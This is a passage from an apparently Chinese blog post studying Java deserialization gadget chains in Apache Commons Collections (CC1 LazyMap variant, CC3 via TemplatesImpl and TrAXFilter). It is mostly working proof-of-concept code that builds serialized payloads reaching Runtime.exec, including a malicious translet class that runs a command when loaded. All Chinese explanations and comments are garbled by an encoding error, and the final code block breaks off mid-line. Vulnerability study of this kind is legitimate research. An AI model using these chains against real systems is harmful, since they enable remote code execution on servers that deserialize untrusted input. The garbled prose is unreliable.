class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"></span><br><span class="line">        method.invoke(user,args);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//UserInvokcationä¸ºä»£ç†ç±»ï¼Œæˆ‘ä»¬è¦ä½¿ç”¨çš„æ˜¯userï¼Œæ‰€ä»¥å°†userè¿™ä¸ªä»£ç†å¯¹è±¡ä¼ å…¥</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">userinvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserInvocationHandler</span>(user);</span><br><span class="line"><span class="comment">//ç”ŸæˆåŠ¨æ€ä»£ç†å¯¹è±¡ï¼š</span></span><br><span class="line"><span class="type">IUser</span> <span class="variable">userproxy</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader()<span class="comment">/*ç±»åŠ è½½å™¨*/</span>,user.getClass().getInterfaces()<span class="comment">/*è¦ä¼ å…¥çš„æ¥å£*/</span>,userinvocationHandler<span class="comment">/*è¦åšçš„äº‹æƒ…ï¼šä»£ç†userå¯¹è±¡*/</span>);</span><br><span class="line">userproxy.show();</span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨æ–¹å¼">åˆ©ç”¨æ–¹å¼:</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ç›®æ ‡ï¼šB.f</span><br><span class="line">è°ƒç”¨é“¾ï¼šA[O] - &gt; O.abc - &gt; B.f</span><br><span class="line">Oä¸ºåŠ¨æ€ä»£ç†ç±»ï¼š</span><br><span class="line">O[B]invoke - &gt; f</span><br><span class="line"><span class="comment">//invoke - &gt; åœ¨æœ‰å‡½æ•°è°ƒç”¨æ—¶è‡ªåŠ¨æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">//æ‹¼æ¥ä¸¤æ¡é“¾ï¼šä»»æ„-&gt;å›ºå®š</span></span><br></pre></td></tr></table></figure><p>åœ¨æŸ¥æ‰¾transformçš„ä½¿ç”¨æ—¶ï¼Œå‡ºäº†TransformedMapï¼Œè¿˜æœ‰LazyMapï¼Œæˆ‘ä»¬ç»§ç»­å°è¯•ä½¿ç”¨LazyMapæ„é€ ccé“¾</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403192236604.png" alt="image-20240403192236604"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403192255625.png" alt="image-20240403192255625"></p><p>è¿›å…¥LazyMap</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403192502296.png" alt="image-20240403192502296"></p><p>å‘ç°æ˜¯åœ¨getæ–¹æ³•ä¸­è°ƒç”¨çš„transformï¼Œä¸”factoryæ˜¯å¯æ§çš„ï¼Œå› æ­¤æˆ‘ä»¬æŸ¥çœ‹æ„é€ æ–¹æ³•ï¼Œå‘ç°è¿˜æ˜¯ä¸€æ ·çš„è°ƒç”¨decorateå¯¹å…¶è¿›è¡Œèµ‹å€¼å°±è¡Œï¼Œæˆ‘ä»¬ç»§ç»­æŸ¥çœ‹å“ªé‡Œè°ƒç”¨äº†getæ–¹æ³•ï¼Œè¿™é‡Œæ–¹æ³•ç‰¹åˆ«å¤šï¼Œæˆ‘ä»¬ç›´æ¥æ¥åˆ°è§¦å‘ç‚¹ï¼Œè¿˜æ˜¯AnnotationInvocationHandlerç±»ï¼Œä½†è¿™æ¬¡æ˜¯invokeæ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403192806351.png" alt="image-20240403192806351"></p><p>å‘ç°å‚æ•°ä¾ç„¶æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œåªæ˜¯æœ‰ifåˆ¤æ–­éœ€è¦æˆ‘ä»¬è¿›è¡Œç»•è¿‡ï¼Œç®€å•æ¥è¯´å°±æ˜¯ä¸èƒ½è°ƒç”¨equalsæ–¹æ³•ï¼Œä¸”è°ƒç”¨çš„ä¸èƒ½æ˜¯æœ‰å‚æ–¹æ³•ï¼Œè€Œæˆ‘ä»¬çš„readObjectæ­£å¥½æœ‰æ— å‚æ–¹æ³•ï¼Œä¸”ç±»åæ˜¯å¯æ§çš„ï¼Œå¦‚ä¸‹å›¾</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403193035325.png" alt="image-20240403193035325"></p><h3 id="POC2">POC2</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ›å»ºInvocationHandler</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å› ä¸ºInvocationHandleræ¥æ”¶çš„æ˜¯maoï¼Œæ‰€ä»¥è¿™é‡Œä»£ç†çš„ç±»å‹ä¹Ÿå¾—æ˜¯mapï¼Œæƒ³è°ƒç”¨hçš„invokeï¼Œå°±åƒä¸‹è¾¹è¿™ä¹ˆå†™å°±è¡Œï¼Œå…·ä½“çš„æˆ‘è¿˜ä¸æ˜¯å¾ˆæ‡‚</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ç»§ç»­å®ä¾‹åŒ–ä¸€ä¸ªInvocationHandleræ¥æ¥æ”¶map</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">o</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,mapProxy);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="CC3">CC3</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401225549195.png" alt=" "></p><p>CC3å…¶å®å°±æ˜¯ç”¨InvokerTransformerè°ƒç”¨äº†tpé“¾ï¼Œç”±äºåœ¨fj1.2.24çš„æ—¶å€™å·²ç»äº†è§£è¿‡äº†è¿™æ¡é“¾å­ï¼Œä¸‹é¢æˆ‘å°±ç®€å•è¯´è¯´ï¼Œå…·ä½“çš„å¯ä»¥å»çœ‹fj1.2.24çš„åšå®¢</p><p>è¿™æ¡é“¾å­ä¸»è¦æ˜¯é€šè¿‡åŠ è½½å­—èŠ‚ç è¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„æ•ˆæœï¼Œé€šè¿‡InvokerTransformerçš„ä»»æ„æ–¹æ³•è°ƒç”¨ï¼Œæ‰§è¡Œåˆ°TemplatesImplçš„newTransformeræ–¹æ³•è¿›è€ŒåŠ è½½æ¶æ„ç±»æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä¸‹é¢æ˜¯è¯¦ç»†åˆ†æ</p><h3 id="TemplatesImpl">TemplatesImpl</h3><p>æˆ‘é—·å…ˆæ¥åˆ°æ¼æ´è§¦å‘ç‚¹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404194527541.png" alt="image-20240404194527541"></p><p>å‘ç°è¿™é‡Œå°†_class[_transletIndex]è¿›è¡Œäº†å®ä¾‹åŒ–ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥è¿›è¡Œä»»æ„ä»£ç çš„æ‰§è¡Œï¼Œç”±äºä¸æ˜¯publicç”¨æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»§ç»­å‘ä¸Šæ‰¾</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404194937317.png" alt="image-20240404194937317"></p><p>äºæ˜¯å°±æ‰¾åˆ°äº†newTransformerè¿™ä¸ªæ–¹æ³•ï¼Œæ—¢ç„¶å·²ç»æ‰¾åˆ°äº†å¯ä»¥è°ƒç”¨çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å°±ç»§ç»­å®Œå–„è°ƒç”¨æ¡ä»¶å³å¯ï¼Œå›åˆ°getTransletInstanceï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦å°†classèµ‹å€¼ä¸ºæˆ‘ä»¬çš„æ¶æ„ç±»æ‰èƒ½è¿›è¡Œæ“ä½œ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404195317785.png" alt="image-20240404195317785"></p><p>æ‰€ä»¥æˆ‘ä»¬ç»§ç»­è·Ÿè¿›defineTransletClassesæ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404200502690.png" alt="image-20240404200502690"></p><p>è¿™é‡Œéœ€è¦æ³¨æ„ä¸‰ä¸ªåœ°æ–¹ï¼Œç¬¬ä¸€ä¸ªæ˜¯_bytecodesä¸èƒ½ä¸ºç©ºï¼Œå†å°±æ˜¯è¿™é‡Œ_class[i] = loader.defineClass(_bytecodes[i]);è¿›è¡Œäº†ç±»åŠ è½½æ“ä½œï¼Œè¿˜æœ‰ä¸€ä¸ªæ²¡æ ‡ï¼Œå°±æ˜¯å›¾ä¸­çš„_tfactoryä¹Ÿå¾—èµ‹å€¼ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼Œæœ€ä¸‹é¢é‚£ä¸ªå°±æ˜¯è¦æ±‚æ¶æ„ç±»çš„çˆ¶ç±»å¿…é¡»æ˜¯ABSTRACT_TRANSLETï¼Œå¦åˆ™ä¼šæŠ¥å¼‚å¸¸ï¼Œå…·ä½“å¦‚ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404200814491.png" alt="image-20240404200814491"></p><p>ä¹Ÿå°±æ˜¯AbstractTransletè¿™ä¸ªç±»</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404201054434.png" alt="image-20240404201054434"></p><p>ç”±äºæˆ‘ä»¬ä¼ å…¥çš„byteæ˜¯äºŒç»´æ•°ç»„ï¼Œæ‰€ä»¥æœ€ç»ˆçš„_transletIndexå°±ä¼šæ˜¯1ï¼Œè¿›è€Œå®ä¾‹åŒ–æˆ‘ä»¬çš„æ¶æ„ç±»ï¼Œæœ€ååªéœ€è¦å°†CC1ä¸­chainedtransformsçš„è°ƒç”¨æ¢æˆTemplatesImplçš„newTransformerå³å¯</p><h3 id="POC1">POC1</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, IOException, ClassNotFoundException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ct</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://æ¼æ´å¤ç°/cc/CC1/src/main/java/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ctDeclaredField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        ctDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ctDeclaredField.set(templates,bytes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Chu0&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="comment">//templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(hashMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformedMap);</span><br><span class="line">        <span class="comment">//serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="POC2-2">POC2</h3><p>æˆ‘ä»¬å¯ä»¥å‘ç°å¦‚æœè¢«ç¦ç”¨äº†InvokerTransformerçš„è¯ï¼ŒCCå“ªæ¡é“¾éƒ½æ— æ³•æ‰§è¡Œï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å°±è€ƒè™‘èƒ½å¦ä¸ä½¿ç”¨ä»–æ¥æ„é€ é“¾å­ï¼Œäºæ˜¯å°±æƒ³æ‰¾åˆ°ä¸€ä¸ªä¸ä½¿ç”¨InvokerTransformeré‡Œé¢åå°„è°ƒç”¨çš„æ–¹æ³•ï¼Œæ‰¾åˆ°ä¸€ä¸ªå¯ä»¥ç›´æ¥è°ƒç”¨Templateslmplçš„newTransformerçš„ç±»ï¼š</p><p>æ‰€ä»¥CC3é“¾å­çš„ä½œè€…æ‰¾åˆ°äº†è¿™æ ·çš„ä¸€ä¸ªç±»<code>TrAXFliter</code>ï¼ˆä¸å­˜åœ¨åºåˆ—åŒ–æ¥å£ï¼‰ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨newTransformerçš„ç±»ï¼š</p><p>é€šè¿‡chainedTransformerç±»ä¸­çš„transformæ–¹æ³•ï¼Œå…ˆä¼ å…¥TrAXFilter.classï¼Œç„¶ååœ¨é€šè¿‡InstantiateTransformerï¼ˆå­˜åœ¨åºåˆ—åŒ–æ¥å£ï¼‰çš„transformæ–¹æ³•ï¼Œå¯¹ä¸Šé¢ç±»å’Œç±»çš„æ„é€ æ–¹æ³•è¿›è¡Œè°ƒç”¨å¹¶å°†<code>TemplatesImpl Templates = new TemplatesImpl();</code>ä¼ å…¥ï¼Œè§¦å‘TrAXFliteræ„é€ æ–¹æ³•ä¸­çš„Templates.newInstance()æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title 